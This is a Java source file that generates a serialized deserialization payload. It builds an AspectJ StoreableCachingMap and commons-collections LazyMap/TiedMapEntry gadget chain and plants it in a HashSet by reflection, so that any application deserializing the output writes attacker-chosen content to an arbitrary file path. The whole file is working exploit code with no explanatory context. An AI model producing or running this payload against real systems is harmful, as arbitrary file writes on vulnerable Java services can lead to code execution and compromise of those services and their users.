
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Aspectj_Exp {
    public static void main(String[] args) throws Exception {
        String path = "E:/";
        String fileName = "AspectWrite.txt";
        Class<?> clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = clazz.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(path, 2);
        Transformer transformer = new ConstantTransformer("content to write".getBytes(StandardCharsets.UTF_8));

        Map lazyMap = LazyMap.decorate(map, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, fileName);

        HashSet<Object> hs = new HashSet<>(1);
        hs.add("aaa");
        setPut(hs, entry);
        ser(hs);
    }

    private static void ser(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(o);
        objectOutputStream.close();

        File file = new File("E:/ser");
        FileOutputStream outputStream = new FileOutputStream(file);
        outputStream.write(baos.toByteArray());
        outputStream.close();
    }

    private static void deser() throws Exception {
        byte[] fileBytes = Files.readAllBytes(Paths.get("E:/ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(fileBytes));
        objectInputStream.readObject();
    }

    public static void setPut(HashSet<Object> hs, Object o) throws Exception {
        // 获取HashSet中的HashMap对象
        Field field;
        try {
            field = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            field = HashSet.class.getDeclaredField("backingMap");
        }
        field.setAccessible(true);
        HashMap innerMap = (HashMap) field.get(hs);

        // 获取HashMap中的table对象
        Field field1;
        try {
            field1 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            field1 = HashMap.class.getDeclaredField("elementData");
        }
        field1.setAccessible(true);
        Object[] array = (Object[]) field1.get(innerMap);

        // 从table对象中获取索引0 或 1的对象，该对象为HashMap$Node类
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        // 从HashMap$Node类中获取key这个field，并修改为tiedMapEntry
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (NoSuchFieldException e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, o);
    }
}